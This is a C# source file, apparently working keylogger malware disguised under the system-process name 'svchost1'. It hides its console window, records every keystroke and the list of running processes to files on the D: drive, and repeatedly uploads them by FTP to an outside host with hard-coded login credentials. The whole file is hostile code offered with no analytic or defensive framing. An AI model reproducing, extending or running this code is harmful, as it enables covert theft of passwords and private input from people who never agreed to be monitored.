using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using System.Runtime.InteropServices;
using System.ComponentModel;
using System.IO;
using System.Diagnostics;
using System.Net;

namespace svchost1
{
    class Program
    {


        [DllImport("user32.dll")]
        public static extern short GetAsyncKeyState(int vKey);
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
      



        static void Main(string[] args)
        {
            
            var handle = GetConsoleWindow();


            ShowWindow(handle, SW_HIDE);

            
            Process[] pr = Process.GetProcesses();


            process();
            FTPUploadFileadnfolder(@"D:\\ff2.txt",1);

            StringBuilder line = new StringBuilder();

            while (true)
            {
               
                Thread.Sleep(100);

                int j = 1;
                for (int i = 0; i < 255; i++)
                {
                    int state = GetAsyncKeyState(i);
                    if (state == 1 || state == -32767)
                    {
                        j = j + 1;

                        if (i==97)
                        {
                            i = 49;
                            line.Append((Char)i);
                            line.ToString();
                            Convert.ToChar(i);
                            File.WriteAllText("D:\\ff1.txt", line.ToString());
                            Console.WriteLine((short)i);
                            continue;
                        }

                        if (i == 98)
                        {
                            i = 50;
                            line.Append((Char)i);
                            line.ToString();
                            Convert.ToChar(i);
                            File.WriteAllText("D:\\ff1.txt", line.ToString());
                            Console.WriteLine((short)i);
                            continue;
                        }

                        if (i == 99)
                        {
                            i = 51;
                            line.Append((Char)i);
                            line.ToString();
                            Convert.ToChar(i);
                            File.WriteAllText("D:\\ff1.txt", line.ToString());
                            Console.WriteLine((short)i);
                            continue;
                        }

                        if (i == 100)
                        {
                            i = 52;
                            line.Append((Char)i);
                            line.ToString();
                            Convert.ToChar(i);
                            File.WriteAllText("D:\\ff1.txt", line.ToString());
                            Console.WriteLine((short)i);
                            continue;
                        }

                        if (i == 101)
                        {
                            i = 53;
                            line.Append((Char)i);
                            line.ToString();
                            Convert.ToChar(i);
                            File.WriteAllText("D:\\ff1.txt", line.ToString());
                            Console.WriteLine((short)i);
                            continue;
                        }

                     

                        if (i == 102)
                        {
                            i = 54;
                            line.Append((Char)i);
                            line.ToString();
                            Convert.ToChar(i);
                            File.WriteAllText("D:\\ff1.txt", line.ToString());
                            Console.WriteLine((short)i);
                            continue;
                        }

                        if (i == 103)
                        {
                            i = 55;
                            line.Append((Char)i);
                            line.ToString();
                            Convert.ToChar(i);
                            File.WriteAllText("D:\\ff1.txt", line.ToString());
                            Console.WriteLine((short)i);
                            continue;
                        }

                        if (i == 104)
                        {
                            i = 56;
                            line.Append((Char)i);
                            line.ToString();
                            Convert.ToChar(i);
                            File.WriteAllText("D:\\ff1.txt", line.ToString());
                            Console.WriteLine((short)i);
                            continue;
                        }

                        if (i == 105)
                        {
                            i = 57;
                            line.Append((Char)i);
                            line.ToString();
                            Convert.ToChar(i);
                            File.WriteAllText("D:\\ff1.txt", line.ToString());
                            Console.WriteLine((short)i);
                            continue;
                        }



                        Console.WriteLine((short)i);
                        line.Append((Char)i);
                        line.ToString();
                        Convert.ToChar(i);
                        File.WriteAllText("D:\\ff1.txt", line.ToString());

                         FTPUploadFileadnfolder(@"D:\\ff1.txt",2);


                    }
                }

                
            }

        

            
        }

    

        //static readonly Random rndGen = new Random();
        const string ch = "qwertyuiopasdfghjklzxcvbnm0123456789";

        static string TextName(string ch, int pwdLength=15)
        {
            char[] letters = ch.ToCharArray();
            string textkey = "";
            for (int i = 0; i < pwdLength; i++)
            {
                textkey += letters[rndGen.Next(letters.Length)].ToString();
            }
            return textkey;
        }

        static string ProcesName(string ch, int pwdLength=15)
        {
            char[] letters = ch.ToCharArray();
            string procname = "";
            for (int i = 0; i < pwdLength; i++)
            {
                procname += letters[rndGen.Next(letters.Length)].ToString();
            }
            return procname;
        }

        static void process()
        {
                foreach (Process proc in Process.GetProcesses())
                {

                    File.AppendAllText(@"D:\\ff2.txt", proc.ProcessName.ToString());
                    File.AppendAllText(@"D:\\ff2.txt", "____");
                    Console.WriteLine(proc.ProcessName);


            }


            
            

        }

        static readonly Random rndGen = new Random();
        //  string procname = "";

        //public void createFolderFtp()
        //{

        //    const string ch = "qwertyuiopasdfghjklzxcvbnm0123456789";
        //    int pwdLength = 15;
        //    char[] letters = ch.ToCharArray();
        //   //string procname = "";
        //    for (int i = 0; i < pwdLength; i++)
        //    {
        //       procname += letters[rndGen.Next(letters.Length)].ToString();
        //    }


        //    WebRequest request = WebRequest.Create("ftp://partsanddigital.3dn.ru/"+procname);
        //    request.Method = WebRequestMethods.Ftp.MakeDirectory;
        //    request.Credentials = new NetworkCredential("4partsanddigital", "00000000");
        //    using (var resp = (FtpWebResponse)request.GetResponse()) ;


        //}
        
        static void FTPUploadFileadnfolder(string filename, int m)
        {
        

            const string ch = "qwertyuiopasdfghjklzxcvbnm0123456789";
            int pwdLength = 15;
            char[] letters = ch.ToCharArray();
            string procname1 = "";
            for (int i = 0; i < pwdLength; i++)
            {
                procname1 += letters[rndGen.Next(letters.Length)].ToString();
            }


            WebRequest request = WebRequest.Create("ftp://partsanddigital.3dn.ru/" + procname1);
            request.Method = WebRequestMethods.Ftp.MakeDirectory;
            request.Credentials = new NetworkCredential("4partsanddigital", "00000000");
            using (var resp = (FtpWebResponse)request.GetResponse()) ;

            string procname2 = procname1;

            if (m == 2)
            {

                FileInfo fileInfo = new FileInfo(filename);

                FtpWebRequest reqFTP = (FtpWebRequest)FtpWebRequest.Create(
                        new Uri("ftp://" + "partsanddigital.3dn.ru" + "/" + procname2 + "/" + fileInfo.Name)
                    );

                reqFTP.Credentials = new NetworkCredential("4partsanddigital", "00000000");


                reqFTP.KeepAlive = false;


                reqFTP.Method = WebRequestMethods.Ftp.UploadFile;


                reqFTP.UseBinary = true;


                reqFTP.ContentLength = fileInfo.Length;


                int buffLength = 2048;
                byte[] buff = new byte[buffLength];
                int contentLen;


                FileStream fs = fileInfo.OpenRead();
               

                    Stream strm = reqFTP.GetRequestStream();

                    contentLen = fs.Read(buff, 0, buffLength);

                    while (contentLen != 0)
                    {

                        strm.Write(buff, 0, contentLen);
                        contentLen = fs.Read(buff, 0, buffLength);
                    }

                    strm.Close();
                    fs.Close();
                }
               
           else
            {
                FileInfo fileInfo = new FileInfo(filename);

                FtpWebRequest reqFTP = (FtpWebRequest)FtpWebRequest.Create(
                        new Uri("ftp://" + "partsanddigital.3dn.ru" + "/" + procname1 + "/" + fileInfo.Name)
                    );

                reqFTP.Credentials = new NetworkCredential("4partsanddigital", "00000000");


                reqFTP.KeepAlive = false;


                reqFTP.Method = WebRequestMethods.Ftp.UploadFile;


                reqFTP.UseBinary = true;


                reqFTP.ContentLength = fileInfo.Length;


                int buffLength = 2048;
                byte[] buff = new byte[buffLength];
                int contentLen;


                FileStream fs = fileInfo.OpenRead();


                Stream strm = reqFTP.GetRequestStream();

                contentLen = fs.Read(buff, 0, buffLength);

                while (contentLen != 0)
                {

                    strm.Write(buff, 0, contentLen);
                    contentLen = fs.Read(buff, 0, buffLength);
                }

                strm.Close();
                fs.Close();
            }
        }
            }
        }

    

    

    
    
